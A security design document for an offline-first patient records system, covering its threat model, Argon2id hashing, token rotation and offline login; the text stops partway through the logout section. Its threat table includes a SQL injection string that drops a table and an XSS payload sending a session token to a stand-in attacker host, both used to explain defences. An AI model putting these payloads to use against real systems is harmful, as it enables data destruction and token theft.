# Security

> **Project:** Design and Implementation of an Offline-Capable Web-Based Patient Records and Referral Management System for Primary Healthcare Centres
> **Document status:** Canonical for security. Where it disagrees with `00-ARCHITECTURE.md` §5, this document wins.
> **Last updated:** Sprint 0
> **Audience:** the student implementing this, and the examiner who will attack it in the viva.

---

## 0. How to read this document

`00-ARCHITECTURE.md` states the one-sentence architecture and moves on:

> The browser is the primary database. The server is a replication peer that also happens to be the authority on identity, security, and referral links.

That sentence is also the entire security problem statement, and it is worth spelling out why:

1. **The attacker's most valuable target is not the server — it is the workstation.** Every laptop in the PHC holds a full replica of every patient record the facility has ever created. Server hardening protects one machine you control; client hardening protects twenty machines sitting in an unlocked records room.
2. **The server can no longer assume the client is honest.** In a normal web app, the frontend is a view onto server state. Here, the frontend *is* the source of truth for a window of time, and the person holding it has the database file. Any control that lives only in the SPA is a suggestion, not a control.
3. **Some data must leave the trust boundary on purpose.** A referral note is read by a facility that has no account, no device key, and no relationship with us. That is a designed, unauthenticated, public read path, and it needs its own model.

Everything below follows from those three facts. Where a control is weak, this document says so and says what it would take to make it strong.

---

## 1. Security objectives and assets

### 1.1 Objectives, in priority order

| # | Objective | What "done" looks like | Why it ranks here |
|---|---|---|---|
| O1 | **Protect patient clinical data at rest on devices** | A stolen laptop yields no readable records | The headline risk of the whole architecture; a breach here is a breach of every patient in the facility |
| O2 | **Preserve integrity of the clinical and financial record** | No undetected modification of a diagnosis, result, dispense, or payment | A corrupted record leads to a wrong clinical decision; a corrupted ledger leads to theft or a false accusation of theft |
| O3 | **Preserve the integrity of the audit trail** | Audit rows cannot be altered or deleted by the application, and never reach a client | If the audit log is tamperable, no other control can be investigated after the fact |
| O4 | **Defend the unauthenticated referral endpoint** | Only the intended recipient, holding the slip, within 48 hours, can read a note | It is the only path in the system with no login in front of it |
| O5 | **Keep availability of the record through device failure** | A dead device loses at most the un-synced tail, and that tail is bounded | For a PHC, "the records are gone" is a clinical emergency, not an IT inconvenience |
| O6 | **Authenticate users and devices independently** | User compromised ≠ device compromised, and vice versa | Two independent failure modes need two independent revocation levers |

Note the ordering. Availability (O5) ranks *below* confidentiality and integrity here, which is unusual for a health system — and it is the honest ranking. A PHC that loses a day of un-synced vitals re-takes them. A PHC whose records leak has exposed people to stigma, discrimination, and in some jurisdictions prosecution. Say this out loud in your defence; it shows you ranked deliberately rather than copying a template.

### 1.2 Asset register

Sensitivity is scored **Low / Medium / High / Critical** per confidentiality (C), integrity (I), and availability (A).

| Asset | Where it lives | C | I | A | Notes |
|---|---|---|---|---|---|
| **Patient clinical record** (diagnoses, vitals, lab results, prescriptions, dispenses, admissions) | IndexedDB replica on every workstation; Neon | Critical | Critical | High | The reason the system exists. Broad PII plus full clinical history. |
| **Referral notes** | Neon; rendered on `/r/:token` | Critical | High | Medium | Reachable without authentication, by design. Contains enough to treat a patient elsewhere. |
| **Patient identifiers (PII)** — name, DOB, phone, address, tribe, occupation, marital status | IndexedDB; Neon | High | High | Medium | Quasi-identifiers: even without a diagnosis, this set re-identifies a person in a small community. |
| **Payment records** (`invoices`, `payments`, tariff history) | IndexedDB; Neon | Medium | Critical | Medium | Money is BIGINT minor units. Integrity failure here means theft or a false accusation. |
| **Credentials** — password hashes, refresh tokens, offline verifiers | Neon; IndexedDB | Critical | Critical | Medium | A cracked password is reusable elsewhere; users reuse passwords. |
| **Device private keys** (ECDSA P-256) | IndexedDB | High | Critical | Medium | Possession of the key plus a stolen token defeats the device control. |
| **Audit log** (`audit_logs`) | Neon only — **never synced down** | High | Critical | Medium | Must be append-only. Its value is entirely in its integrity. |
| **Referral access log** (`referral_access_log`) | Neon only | Medium | High | Low | Evidence of who read a leaked link. |
| **JWT signing secret / DB credentials** | Secret Manager | Critical | Critical | High | Compromise forges any identity in the system. |
| **Application code and build artefacts** | GitHub; CF Pages; Cloud Run image | Low | High | Medium | Integrity matters (supply chain); confidentiality does not. |
| **Device public keys and revocation state** | Neon | Low | Critical | Medium | Tamper here and a revoked device works again. |

### 1.3 The one-line asset summary for your defence

> The crown jewels are not in the database. They are on the twenty laptops in the PHC, in a browser storage bucket, behind a login screen that — for up to seven days — does not need the network to work.

---

## 2. Threat model

### 2.1 Method and scope

Categories are STRIDE, applied per element: **S**poofing, **T**ampering, **R**epudiation, **I**nformation disclosure, **D**enial of service, **E**levation of privilege.

Scoring:

- **Likelihood:** Low / Medium / High, judged for a real PHC in a low-resource setting over a one-year horizon — *not* for a datacentre.
- **Impact:** Low / Medium / High / Critical, judged on patient harm, then legal/regulatory exposure, then financial loss.
- **Residual risk** is the risk *after* the mitigations listed. A residual risk of "Accepted" is a deliberate decision, not an oversight.

Out of scope for this threat model: nation-state adversaries, physical attack on Neon or Google infrastructure, and supply-chain compromise of the base container image. Those are real, but they are outside what a student project can act on, and pretending otherwise wastes your time.

### 2.2 Threat register

| # | STRIDE | Threat | Realistic PHC scenario | L | Impact | Mitigation | Residual risk |
|---|---|---|---|---|---|---|---|
| **T1** | I | **Stolen/lost workstation with the full local replica** | A nurse's bag is taken from a parked car, or the records-room laptop walks during a market day. The browser profile contains every patient record the facility has, plus a refresh token and a device private key. | **High** | **Critical** | Full-disk encryption **mandatory** (BitLocker/LUKS/FileVault) as a deployment requirement, not advice; device key + refresh token revocable server-side within minutes; `IndexedDB` wiped on logout; absolute offline retention cap (§6.4); admin "clear local replica" for decommissioned devices; screen lock ≤5 min. | **Medium–High. Accepted.** If FDE is not enforced at enrolment the device is a plaintext database. You cannot fix this in software alone; it is an operational control you must document and check during deployment. |
| **T2** | S / E | **Shared workstation: staff member uses another's unlocked session** | A cashier steps out for prayer; a colleague keys a payment against their own name on the open session. Or: a shared "triage" machine is left logged in all day so nobody has to re-authenticate offline. | High | High | Short access-token TTL (15 min) with no silent offline extension; idle screen lock at 5 min; every mutation stamped `created_by`/`updated_by` from the **token**, never from the request body; per-user IndexedDB namespacing keyed by `user_id`; audit of every action; conspicuous "logged in as X" header in the UI. | **Medium.** The audit trail deters and detects, but attribution is only as good as the session. Shared-login practices are cultural; the UI must make the current user impossible to miss. |
| **T3** | I / E | **Curious or malicious insider reads a VIP's sensitive notes** | A cashier — who needs the billing screen — opens a colleague's session or uses a token from browser devtools to query `/patients/:id` and reads HIV-related notes on a local dignitary. | High | Critical | RBAC enforced in the **service** layer (§5), not the SPA; sensitive records gated behind a narrower capability than general read; audit every record read (not just writes) for sensitive flags; alert on out-of-role access patterns; break-glass access with mandatory reason. | **Medium.** Internal snooping is the hardest threat to eliminate. Detection and attribution are the realistic goal. |
| **T4** | T / S | **Forged or replayed sync push** | A former staff member keeps a valid refresh token and replays a captured `POST /sync/push` body — legitimate-looking vitals — to inject records, or replays it many times to inflate data. | Medium | High | `/sync/push` requires **JWT + valid ECDSA P-256 device signature** (§4); canonical string binds method + path + device ID + body hash + timestamp + nonce; ±5 min timestamp window; server-side nonce cache rejects replays; operation IDs make legitimate retries idempotent but do **not** make forged payloads valid. | **Low–Medium.** Depends on the nonce cache having a TTL at least as long as the acceptance window, and on clocks being roughly sane (see T7). |
| **T5** | T | **Offline tampering with clinical records, then syncing** | A pharmacist edits a queued dispense quantity in IndexedDB devtools before the outbox drains; a doctor backdates a diagnosis to cover a delay. | Medium | High | Client `updated_at` is retained for corrections but the server records `received_at`; audit log captures what each push contained; server-side validation rejects values outside domain ranges (§8.3); clinical facts are append-only where they should be; anomalies (backdated `updated_at`, out-of-order revisions) surfaced in a discrepancy report. | **Medium. Partly accepted.** Offline-first means the client is trusted for *timing* of clinical facts. Integrity is preserved *from the point of sync* onward, which is all the audit log can honestly claim. Say this plainly — examiners respect a stated limit far more than a hand-wave. |
| **T6** | I | **Referral link shared beyond the intended recipient** | A doctor WhatsApps a screenshot of the slip; a receptionist forwards the URL to a friend at another facility "to save time"; the link ends up in a group chat with 200 members. | High | High | 48-hour hard expiry enforced **in the SQL query**, not the UI; 6-digit PIN as a second factor printed on the physical slip only; every view written to `referral_access_log` with IP and user agent; issuing doctor can revoke; public payload is minimised (§7.7). | **Medium–High. Accepted.** A bearer link is a bearer link. Expiry bounds the damage window; the log makes the leak visible after the fact. |
| **T7** | S / T | **Device clock manipulation to forge timestamps** | A user sets the workstation clock back a week to record a "today" vitals reading, or forward to make a record look old, or to keep an expired offline session alive. | Medium | Medium | Server is the authority on session validity and referral expiry — never the device; `device_recorded_at` stored alongside server `received_at` and a discrepancy flag raised beyond a threshold; offline grace measured against a monotonic-ish local counter plus server-issued `offline_deadline`, not against device wall-clock alone; NTP required on the workstation. | **Medium.** You cannot fully prevent this offline. You *can* make it visible. |
| **T8** | T / R | **Duplicate payment submission / double-charging** | A flaky connection retries a push; the server applies the same payment twice. Or a cashier deliberately re-submits to skim, betting nobody reconciles. | Medium | High | Client-generated UUIDv7 primary keys plus operation IDs make retries idempotent; `payments` has a natural-key uniqueness constraint (`invoice_id`, `receipt_number`); ledger is append-only, balances are always derived `SUM(charges) − SUM(allocations)` (never stored); void/reverse requires a reason and is a distinct capability; cashier does not reconcile their own till (§5.4). | **Low** for accidental duplication, **Medium** for deliberate. Detected by reconciliation, not prevented by code. |
| **T9** | T / E | **SQL injection** | An attacker (or a careless client) passes `'; DROP TABLE patients; --` or a `UNION SELECT` in a patient search field, or in a `patient_name` field inside a sync payload — the offline client is easy to modify, so the payload is a genuine injection vector, not a theoretical one. | Medium | Critical | **Parameterised queries only** via pgx `$n` placeholders; no `fmt.Sprintf` into SQL, ever; dynamic sort/filter columns validated against a hard-coded allow-list; least-privilege DB role that cannot `DROP`; see §8.1 for the correct and incorrect forms. | **Low.** With placeholders everywhere this is a solved problem; the risk is one developer having a bad afternoon. |
| **T10** | T / I | **Stored XSS via patient-supplied text** | A patient's name is entered as `<img src=x onerror=fetch('https://evil/'+localStorage.token)>`. It is stored, synced, and rendered on a dozen screens plus the referral page. | Medium | Critical | React escapes text by default — never use `dangerouslySetInnerHTML` for any field that came from a patient or a client; strict CSP with no `unsafe-inline`; no `eval`; tokens held in memory (Zustand) rather than `localStorage` where feasible; server-side length/charset validation so the payload cannot even be stored in a pathological form. | **Low–Medium.** The residual risk lives in the SPA dependency tree and in any markdown/rich-text widget you add later. |
| **T11** | S / T | **CSRF** | A staff member, logged in, visits a malicious page that auto-submits a form to the API. | **Low** | High | Auth is `Authorization: Bearer`, **not** cookies — a browser will not attach the header cross-site, so classic CSRF does not apply. CORS allow-list blocks cross-origin reads; `Content-Type: application/json` required on mutations so no simple-form cross-site POST is possible. | **Low.** Explicitly do not add cookie auth later without revisiting this. |
| **T12** | D | **Device dies with un-synced records** | The triage laptop's disk fails after three offline days. Two hundred registrations exist nowhere else. | Medium | High | Bounded outbox and an aggressive drain policy (push whenever *any* connectivity appears); surface "N unsynced records — oldest X hours" prominently in the UI; local export/backup of the outbox as an encrypted file as a manual escape hatch; documented rule: **a device must not be taken out of service until its outbox is empty**. | **Medium. Accepted as the core availability trade-off.** Offline-first buys uptime with durability. Mitigate with visibility and process, not with a promise you cannot keep. |
| **T13** | I | **Backup exfiltration from Neon** | A leaked Neon API key, a `pg_dump` on a laptop in a café, or over-broad access to a branch gives an attacker the entire history at once. | Low | Critical | Neon project restricted to the minimum number of humans; API keys scoped and rotated; no production data in dev branches (schema-only branching); PITR window sized deliberately; database credentials in Secret Manager and never in the repo or the image; separate least-privilege roles for the API vs migrations; alert on anomalous export volume. | **Medium.** Concentrated risk is inherent to centralisation. Note for production: column-level encryption or a separate secrets vault for the most sensitive fields, and audited break-glass for direct DB access. |
| **T14** | S | **Referral PIN brute-force** | The token leaks into a chat group. An attacker scripts 10⁶ PIN guesses against `/r/:token` — the token is known, the PIN is only six digits. | Medium | High | Argon2id-hashed PIN (never stored plain); rate limiting per token **and** per IP; hard lockout after 5 failures with a logged reason; lockout is not resettable by the attacker; the whole referral can be revoked. | **Low–Medium.** 10⁶ is small; if it were not for the lockout it would fall in seconds. Lockout is the *only* thing making the PIN meaningful — treat it as load-bearing. |
| **T15** | I | **QR photographed from a discarded slip** | The POS slip is binned at reception; a passer-by photographs the QR. Now they have the token and the PIN, printed together, on the same piece of paper. | High | High | The PIN and token together are one factor, not two, on a physical slip — say so honestly; 48-hour expiry; POS slip includes a "contains confidential patient information — shred after use" warning and no patient name on the customer-facing portion; access log + revocation for suspected leaks. | **High. Accepted.** This is the weakest link in the referral design and no amount of code fixes paper. Production answer: not printing the PIN, or requiring the receiving clinician to authenticate. |
| **T16** | R | **Repudiation of a clinical action** | "I never ordered that lab test." "I never voided that payment." | Low | Medium | Server-side append-only `audit_logs` with actor, device, IP, and payload digest; rows carry `created_by`/`updated_by`; audit rows are never synced to clients so they cannot be edited offline; DB grants revoke `UPDATE`/`DELETE` from the application role (§6.5). | **Low.** Attribution is only as strong as the session (see T2). |
| **T17** | D | **Unauthenticated referral endpoint used as a DoS amplifier** | `/r/:token` is public. Every request that passes the token check triggers a DB read and possibly an Argon2id PIN verification — and Argon2id is *deliberately* expensive. A thousand concurrent bogus PIN attempts pin the CPU. | Medium | Medium | Token check **before** any Argon2id work; unknown/invalid tokens rejected without touching the PIN path; per-IP and global rate limits on the referral route class; Argon2id verification concurrency bounded by a semaphore; Cloud Run concurrency cap and `max-instances` so one endpoint cannot starve the rest. | **Medium.** See §9.3 — this is a real, specific, and easily overlooked cost of the design. |
| **T18** | E | **Client-side authorisation bypass** | The attacker edits the SPA bundle, or calls the API directly with a `cashier` token, to reach a `doctor`-only endpoint. Route guards are irrelevant because they own the browser. | High | High | Every capability is enforced in the **service** layer (§5.5); handlers never call repos directly (architecture §4.1); the role comes from the verified JWT and is re-checked against the DB row on every request that matters; tests assert 403 for each wrong-role pair (§12). | **Low**, provided the service layer is actually the chokepoint. This is the single most important structural rule in the codebase. |
| **T19** | I | **Sensitive category leakage by inference** | HIV status is visible indirectly: the pharmacy queue shows a drug regimen, the billing screen shows a code, or a lab worklist name reveals it. | Medium | Critical | Treat the *regimen* and *order* as sensitive too, not just a `hiv_status` column; a `sensitive` flag propagated to dependent order/result/dispense rows; restricted read capability; see §6.7 for the honest trade-off. | **High. Partly accepted.** Inference-proofing a clinical UI is a research problem. In a student project, pick the top three leak paths and close those. |
| **T20** | D | **Cloud Run cold start treated as an outage by the sync client** | A 3 s cold start plus a Neon wake-up causes the pusher to time out, mark the batch failed, and retry in a tight loop — hammering the API. | Medium | Medium | 30 s client timeout, exponential backoff with jitter, bounded batch sizes, and a circuit breaker; Cloud Run `--min-instances=1` for the defence demo. | **Low.** An availability-hygiene issue, not a security hole, but it belongs in the register because the fix is a security-adjacent design decision. |

### 2.3 The three threats to lead with in your defence

If you have ninety seconds, present these three and the control that stands in the way of each:

1. **T1 — the stolen laptop.** Mitigated by full-disk encryption (operational), device revocation (technical), and a bounded offline retention window (design). Residual risk accepted and documented.
2. **T5 — offline tampering.** Mitigated by the device signature, the server-side audit of every push, and domain validation. The honest limit: the server cannot verify what it never saw.
3. **T18 — client-side authorisation bypass.** Mitigated by making the service layer the only place a permission decision is made. Given a fully replicated client, this is the difference between a system with access control and a system with an access-control-shaped UI.

---

## 3. Authentication

### 3.1 Argon2id parameters

Argon2id is the only password KDF in this system. Parameters follow RFC 9106 and the OWASP Password Storage Cheat Sheet, tuned to what a PHC workstation and a Cloud Run instance can each afford.

| Parameter | Recommended value | Reasoning |
|---|---|---|
| **Algorithm** | Argon2id (v=19) | Hybrid: the first pass is data-independent (Argon2i-like) which resists side-channel/timing attacks on memory access; subsequent passes are data-dependent (Argon2d-like) which resists GPU cracking. Recommended by RFC 9106 as the default when you have no reason to pick otherwise. |
| **Memory (`m`)** | **65536 KiB (64 MiB)** | The dominant cost parameter. Cracking cost scales with memory, and memory is exactly what GPUs and ASICs cannot cheaply provide. 64 MiB is the OWASP floor for Argon2id; drop to 46 MiB only if the API's memory budget forces it, and never below. |
| **Iterations (`t`)** | **3** | Time cost. 3 passes over 64 MiB lands comfortably under ~250 ms on a Cloud Run vCPU while making each guess ~3× more expensive. |
| **Parallelism (`p`)** | **2** (server), **1** (browser) | Server: uses two lanes on a typical 2+ vCPU Cloud Run instance. Browser: keep `p=1` for the offline verifier so a low-end workstation is not blocked for seconds during offline login — the offline verifier protects a local file that is already behind FDE, so it can afford to be cheaper than the server hash. |
| **Salt** | **16 random bytes**, `crypto/rand` | Per-hash, unique, stored alongside the hash. Never a constant, never the user ID, never reused between the server hash and the offline verifier. |
| **Key length** | **32 bytes** | 256-bit output; matches the security level of the rest of the system. |
| **Encoding** | PHC string | `$argon2id$v=19$m=65536,t=3,p=2$<b64salt>$<b64hash>` — self-describing, so parameters can be raised later and old hashes still verify. |
| **Pepper (production only)** | 32 bytes from Secret Manager, HMAC-SHA-256 applied to the password before hashing | Optional. Not required for the project; note it as the production answer to "what if the DB alone leaks". |

Two rules that matter more than the exact numbers:

1. **Store the parameters with the hash.** When you raise `m` next year you rehash on next successful login. A single hard-coded constant in a Go file makes that impossible without a migration break.
2. **Verification must be constant-time with respect to the hash comparison.** Use `subtle.ConstantTimeCompare`, not `bytes.Equal`.

```go
// internal/platform/argon2/argon2.go
type Params struct {
    Memory      uint32 // KiB
    Iterations  uint32
    Parallelism uint8
    SaltLength  uint32
    KeyLength   uint32
}

var Default = Params{Memory: 64 * 1024, Iterations: 3, Parallelism: 2, SaltLength: 16, KeyLength: 32}

func Hash(password string, p Params) (string, error) {
    salt := make([]byte, p.SaltLength)
    if _, err := rand.Read(salt); err != nil {
        return "", fmt.Errorf("argon2: read salt: %w", err)
    }
    key := argon2.IDKey([]byte(password), salt, p.Iterations, p.Memory, p.Parallelism, p.KeyLength)
    return fmt.Sprintf("$argon2id$v=%d$m=%d,t=%d,p=%d$%s$%s",
        argon2.Version, p.Memory, p.Iterations, p.Parallelism,
        base64.RawStdEncoding.EncodeToString(salt),
        base64.RawStdEncoding.EncodeToString(key)), nil
}
```

**Verification cost is also a DoS surface.** Cap concurrent Argon2id operations with a semaphore sized to the instance's vCPU count, and apply the login rate limit *before* spending CPU on a hash (§9.1). An endpoint that hashes whatever arrives is a free CPU exhaustion primitive.

### 3.2 Access token claims

`ACCESS_TOKEN_TTL=15m`, HS256, signed with `JWT_SECRET` (≥32 random bytes, from Secret Manager in production).

| Claim | Type | Example | Purpose | Why it is here |
|---|---|---|---|---|
| `iss` | string | `phc-records-api` | Issuer | Lets you reject tokens minted by a staging deployment with a shared secret. Check it. |
| `aud` | string | `phc-records-web` | Audience | Prevents a token minted for one service being replayed at another. |
| `sub` | string (UUID) | `0192f3…` | The `users.id` | The only identity that matters. Every `created_by` is derived from this, never from the request body. |
| `jti` | string (UUID) | `0192f4…` | Token identifier | Enables a denylist for immediate revocation of a single access token (e.g. on password change) without waiting 15 minutes. Keep the denylist TTL at 15 min so it stays tiny. |
| `role` | string | `nurse` | One of the eight roles | **Included for a specific reason: the client must work offline.** The SPA uses it to render the correct navigation and to make local, offline authorisation decisions while the server is unreachable. Without it, an offline device cannot decide whether to show the dispense button. |
| `device_id` | string (UUID) | `0192f6…` | Bound device | Ties the session to the device that obtained it. Mismatch with the signing device on `/sync/push` is a hard reject. |
| `sid` | string (UUID) | `0192f7…` | Session ID | Groups the access token with its refresh-token family so revoking a session revokes both. |
| `offline_deadline` | int (unix) | `1730000000` | `iat + OFFLINE_GRACE_PERIOD` | The absolute moment the device must re-authenticate online. See §3.5. |
| `iat` / `exp` / `nbf` | int (unix) | | Issued / expiry / not-before | Standard. `exp − iat` = 900 s. Clock skew tolerance ≤60 s. |

**Why is `role` in the token at all, when the server re-checks it anyway?**

Because the two uses are different, and conflating them causes bugs:

- **The SPA uses the claim for UX.** Offline, it cannot ask anyone. It renders the doctor's consultation screen based on `role`.
- **The server uses the claim only as a hint, then re-checks.** Every request that performs a capability check loads the live `users` row (or a cache with a short TTL, invalidated on role change and on token revocation) and uses **that** role. Why: if an admin demotes a nurse to `front_desk`, the nurse's outstanding 15-minute token still says `nurse`. Re-checking server-side means the demotion takes effect within one cache TTL instead of within 15 minutes at best, and it means a stolen token cannot be used to claim a role the account no longer has.

The corollary that people get wrong: **never trust a role from the request body, a query parameter, or a custom header.** Only the verified, server-re-checked token.

### 3.3 Refresh token rotation with reuse detection

Refresh tokens live in Postgres (`refresh_tokens`), never in a cookie — the offline client must hold one while the network is down, and cookies add `SameSite` complexity for no benefit (architecture §3.5).

```
refresh_tokens
  id             UUID PK
  family_id      UUID NOT NULL         -- the rotation lineage
  session_id     UUID NOT NULL         -- == access token `sid`
  user_id        UUID NOT NULL
  device_id      UUID NOT NULL
  token_hash     BYTEA NOT NULL        -- SHA-256 of the opaque token; never the token
  issued_at      TIMESTAMPTZ NOT NULL
  expires_at     TIMESTAMPTZ NOT NULL  -- issued_at + 30 days
  rotated_at     TIMESTAMPTZ NULL      -- set when this token was exchanged
  replaced_by    UUID NULL             -- the successor token id
  revoked_at     TIMESTAMPTZ NULL
  revoked_reason TEXT NULL
  created_ip     INET
  user_agent     TEXT
```

Flow:

1. `POST /auth/refresh` with the opaque refresh token.
2. Look up by `token_hash`. Not found → 401, and log it as an anomaly.
3. **If `rotated_at IS NOT NULL` → this is a reuse event.** The token was already exchanged. Revoke the **entire family** (`UPDATE refresh_tokens SET revoked_at = now(), revoked_reason = 'reuse_detected' WHERE family_id = $1`), invalidate the session, and write an audit row with severity `high`. Return 401.
4. If `revoked_at IS NOT NULL` or `expires_at < now()` → 401.
5. Otherwise: within one transaction, mark this row rotated (set `rotated_at`, `replaced_by`), insert a fresh row with the **same `family_id`** and a new 30-day expiry, and return a new access token + new refresh token.

**Why revoke the whole family, and not just the reused token?**

Because a reuse event is ambiguous in exactly the wrong way, and you must assume the worse reading:

- **Benign case:** the client crashed mid-rotation and retried the old token. Annoying, but the user re-logs in. Cost: one login.
- **Malicious case:** an attacker stole the refresh token. Either the attacker or the legitimate user rotated first. Whichever token is presented second is a reuse. The server **cannot tell which party is the attacker** — and if it guesses wrong by trusting the legitimate user, the attacker keeps a live session indefinitely.

Revoking the family fails closed: both parties are locked out, the user re-authenticates with a password the attacker does not have, and the attacker loses access. The user notices a forced login; that is an acceptable cost for closing a live session hijack. This is the standard OAuth 2.1 / RFC 6819 reasoning and it is worth citing in your report.

Store the token as an **opaque 32-byte random value, base64url**, and store only its SHA-256. It is a high-entropy random value, so a fast hash is correct here — the same reasoning as §7.3 (unlike a password or a PIN, there is nothing to brute-force).

### 3.4 First login online → offline login: the complete flow

The requirement is that a staff member can log in and work with no network. The trap is obvious and fatal: **you must never store the plaintext password, and you must never store the server's password hash.**

Storing the server's hash is wrong because that hash is a *credential equivalent* — it is exactly the value the server compares against, so anyone who reads the local replica can replay it at the login endpoint. Storing the plaintext is worse. The fix is a **separate verifier derived with a device-local salt and its own parameters**, which is not comparable to anything the server holds.

#### Setup — first login, online, on this device

1. Staff member opens the SPA on a workstation and enters username + password. This step **requires connectivity**; the UI must say so clearly rather than failing mysteriously.
2. `POST /auth/login` over TLS with `{ username, password, device_id, device_public_key }`.
3. Server looks up the user, verifies the password with Argon2id against `users.password_hash`, checks `users.status = 'active'`, and checks that `device_id` is either already registered to this user or is a new device pending approval.
4. Server returns: an access token (15 min), a refresh token (30 days), the user profile (id, role, display name), and `offline_deadline = now + OFFLINE_GRACE_PERIOD`.
5. The client generates a **device-local salt**: 16 random bytes from `crypto.getRandomValues`. This salt never leaves the device and is unrelated to the server's salt.
6. The client derives the offline verifier **in the browser**, using a WebAssembly or JS Argon2id implementation (the same library across builds — pin the version):

   ```
   verifier = Argon2id(
       password   = UTF-8(password),
       salt       = device_local_salt,          // 16 random bytes, device-only
       memory     = 32768 KiB,                  // 32 MiB: browser budget
       iterations = 3,
       parallelism= 1,
       keyLength  = 32
   )
   ```

7. The client **discards the plaintext password from memory immediately** after deriving. It is not written anywhere, not to IndexedDB, not to `localStorage`, not to a Zustand store that gets persisted.
8. The client writes a `local_credentials` row into IndexedDB:

   ```ts
   interface LocalCredential {
     userId: string;              // uuidv7 — the key
     username: string;
     displayName: string;
     role: Role;                  // for offline UI decisions only
     saltB64: string;             // device-local, 16 bytes
     verifierB64: string;         // Argon2id output, 32 bytes
     params: { m: number; t: number; p: number };  // so params can be raised later
     kdfVersion: 1;
     createdAt: number;
     lastVerifiedAt: number;
   }
   ```

   Written on the **same origin** as the rest of the replica, in the same IndexedDB database, so one "clear local replica" removes everything.

9. The client also stores, in a `session` store: the refresh token, the `device_id` and device key handle, `offline_deadline`, and `last_online_auth_at`. The access token is held **in memory only** (Zustand, non-persisted) — it is worthless after 15 minutes and not worth persisting.
10. The device keypair is generated or confirmed (§4) and its public half is registered server-side.

#### Subsequent login, offline

11. Staff member opens the SPA with no connectivity. The service worker serves the cached app shell (architecture §3.4).
12. The client sees `navigator.onLine === false` (or the login request times out) and switches to **offline login mode**, showing the last-known user list for this device.
13. The user selects their account and enters their password.
14. The client re-derives the verifier using the stored `saltB64` and `params`, then compares with the stored `verifierB64` using a **constant-time comparison**.
15. On match, the client checks `now <= offline_deadline`. If it has passed, refuse and show the re-authentication notice (§3.5).
16. On success, a **device-bound offline session** is created in memory:
    - no server-issued access token (there is none to get);
    - a local session record `{ userId, deviceId, role, issuedAt, offlineDeadline }`;
    - the sync engine marks itself `offline_session`; pushes are queued but not attempted until connectivity returns **and** a real access token is obtained.
17. Every write during the offline session stamps `created_by = userId` from that local session, and the outbox entry records `device_id`. When the outbox later drains, the server validates that the `created_by` in each operation is consistent with the JWT `sub` — a mismatch rejects the operation and files an audit anomaly.
18. On reconnect, the client silently exchanges its refresh token for a fresh access token. If the refresh token is expired or revoked, the user is forced to log in online — and if the offline session's writes are still queued, the client **keeps them** and pushes them after re-authentication, rather than discarding a shift's work.

#### What this design does and does not protect against

| Attack | Protected? | Why |
|---|---|---|
| Reading the plaintext password from device storage | **Yes** | It is never stored. |
| Replaying a stored value against `/auth/login` | **Yes** | The verifier is derived with a device-only salt and is not the server's hash; presenting it as a password fails. |
| Cracking the verifier to recover the password | **Partly** | Argon2id at 32 MiB makes it expensive but not impossible for a weak password. Residual risk: user password choice. Mitigate with a minimum-length policy, not with complexity rules. |
| Offline unlimited password guessing against the verifier | **No** | An attacker with the file can guess forever. Mitigate with a local attempt counter and an escalating lockout, and accept that a determined local attacker wins. |
| Reading patient data after cracking the device | **Yes, if FDE is absent — no.** | Which is why full-disk encryption is a **deployment requirement**, not a nice-to-have. |

> **Residual risk, stated plainly for your report:** offline login means the device holds a password-equivalent test. Argon2id plus full-disk encryption raises the cost of exploiting it; nothing eliminates it. The 7-day window exists partly to bound how long that exposure sits on the device.

### 3.5 The offline grace period

`OFFLINE_GRACE_PERIOD` (default `168h` = 7 days), with the consequence on expiry set by `OFFLINE_POLICY` — see `00-ARCHITECTURE.md` §5.1. The **default is the safer posture**: `block_writes`, meaning new writes stop while existing data stays readable.

This is a **hard security boundary**, not a convenience timer. Under `warn_only` it becomes a warning rather than a boundary, and that is a deliberate, recorded weakening — see the note on revocation below.

**Why the window exists at all:**

- **Revocation needs a bound.** Without it, a device that is lost, stolen, or held by a dismissed employee can work forever with no server contact. A finite window means every device must re-establish trust periodically, so a revoked account or device eventually stops working — even if the device never sees the revocation.
- **It caps the damage from an undetected theft.** Seven days of exposure is bad; unbounded exposure is worse.
- **It bounds drift.** After a week offline, a device's schema version, tariff table, and user roster are all stale. Forcing a re-auth forces a sync.
- **It is a UX compromise, not a security ideal.** The security ideal is re-authentication every day. A PHC with a flaky link cannot work that way, so seven days is the negotiated default. Write that trade-off down.

> **What `OFFLINE_POLICY` must never be allowed to weaken.** The grace window is about *stale authorisation*; server-side **revocation** is about *withdrawn* authorisation. A revoked device or user must stop working **immediately and unconditionally**, under either policy. If you implement `warn_only` such that a revoked device keeps writing because the grace window has not expired, you have converted a convenience setting into a security hole. Test this explicitly: revoke a device, keep it offline, and confirm it refuses to write.

**Mechanics:**

| Point in time | State | Behaviour |
|---|---|---|
| Day 0 | Online login | `offline_deadline = now + 168h` written locally and into the token. |
| Day 0–5 | Within window | Offline login works normally. A subtle badge shows days remaining. |
| Day 5 | 48 h left | Non-blocking banner: "Offline access expires in 2 days. Connect to the internet to continue." |
| Day 6 | 24 h left | Prominent, dismissible-per-session banner, amber. Shown on every screen. |
| Day 6.75 | 6 h left | Persistent red banner with a countdown. Sync status panel shows `OFFLINE EXPIRING`. |
| Day 7 | Expired | **Offline login is refused.** The app enters *read-only offline* mode: the user can still read the records already on the device (a clinician mid-shift must not lose access to a patient's history) but **cannot create or modify records**, because un-synced writes with no valid session cannot be attributed. A blocking modal explains: "Offline access has expired. Connect this device to the internet and sign in again." |
| On reconnect | Any point | Successful online login resets `offline_deadline` and resumes full read/write. Queued outbox entries from the expired window are pushed (they are attributed and signed), then normal operation resumes. |

Two implementation details that make this honest:

- The deadline is stored **server-issued**. The client cannot extend it by changing its own clock because the value came from the server; a device-clock rollback only makes the local check *stricter*, never looser. When connectivity returns, the server re-issues the deadline from its own clock.
- When an offline session was expired but the device has queued mutations, they are **not silently dropped**. They are pushed after re-authentication and the server flags them as `offline_window_exceeded` in the audit log. Silently discarding a nurse's shift work is a data-loss bug that will show up in your demo.

**Why read-only and not a full lockout at expiry:** the alternative — locking a nurse out of a patient's allergy history because the clinic's router died — is a *clinical safety* failure. Read-only preserves the safety property while refusing to accept new, unattributable writes. This is the kind of reasoning an examiner wants to see.

### 3.6 Logout, local wipe, and device decommissioning

Logout has to be more thorough here than in a normal web app, because logging out is the user's main defence on a shared machine.

**User logout (`POST /auth/logout` + local wipe):**

| Step | Action | Reason |
|---|---|---|
| 1 | `POST /auth/logout` with the refresh token | Server marks the whole session revoked (`revoked_reason = 'logout'`). |
| 2 | Clear in-memory state | The access token, current user, active encounter. |
